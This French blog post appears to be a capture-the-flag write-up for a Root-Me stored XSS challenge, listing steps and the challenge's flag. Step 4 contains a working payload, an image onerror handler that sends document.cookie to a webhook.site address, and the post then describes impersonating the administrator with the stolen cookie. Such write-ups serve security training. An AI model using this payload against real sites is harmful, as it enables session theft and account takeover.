---
title: 'XSS - Stockée 1'
description: "Exploitation d'une vulnérabilité XSS stockée pour voler des cookies"
pubDate: 'Jul 1 2025'
heroImage: 'https://static.actu.fr/uploads/2024/03/france-travail-cyberattaque-piratage-hackeurs.jpeg'
---

## 9. XSS - Stockée 1

**Objectif :** Voler le cookie de session de l'administrateur et l'utiliser pour valider l'épreuve  
**Méthode :** Injection XSS stockée avec exfiltration de cookies  
**Outils utilisés :** Webhook.site / Injection de code / JS  
**Temps :** 25 minutes  
**Flag :** `NkI9qe4cdLIO2P7MIsWS8ofD6`

### Solution

Exploitation d'une vulnérabilité XSS stockée pour voler les cookies d'un administrateur.

![Challenge XSS Stockée](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2009.59.44.png)

**Étapes :**
1. Tester l'injection de code avec `alert('hey')` dans le champ description
2. Confirmer que l'injection fonctionne
3. Créer un webhook sur webhook.site pour capturer les données
4. Injecter le payload XSS :
   ```html
   <img src="x" onerror="new Image().src='https://webhook.site/602ea2d1-dbf7-4c77-a784-8c8381fb7ae6?cookie='+document.cookie">
   ```
5. Attendre que l'administrateur visite la page
6. Récupérer le cookie sur le webhook
7. Utiliser le cookie pour s'authentifier comme administrateur

![Test d'injection XSS](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2009.59.51.png)

![Configuration du webhook](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2010.00.06.png)
